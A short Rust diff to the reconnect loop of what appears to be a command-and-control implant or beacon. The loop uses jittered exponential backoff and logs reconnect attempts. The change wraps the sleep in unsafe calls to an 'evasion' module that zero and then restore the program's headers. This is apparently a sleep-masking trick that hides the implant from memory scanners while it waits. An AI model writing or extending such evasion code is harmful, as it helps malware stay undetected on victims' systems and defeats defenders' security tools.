@@ -195,7 +195,9 @@ async fn main() -> anyhow::Result<()> {
         let jitter = rand::thread_rng().gen_range(-RECONNECT_JITTER..RECONNECT_JITTER);
         let delay = backoff * (1.0 + jitter);
         dbg_log!("[*] Reconnecting in {delay:.1}s...");
+        unsafe { evasion::sleep::zero_headers(); }
         tokio::time::sleep(Duration::from_secs_f64(delay)).await;
+        unsafe { evasion::sleep::restore_headers(); }
         backoff = (backoff * 2.0).min(RECONNECT_MAX);
     }
 }
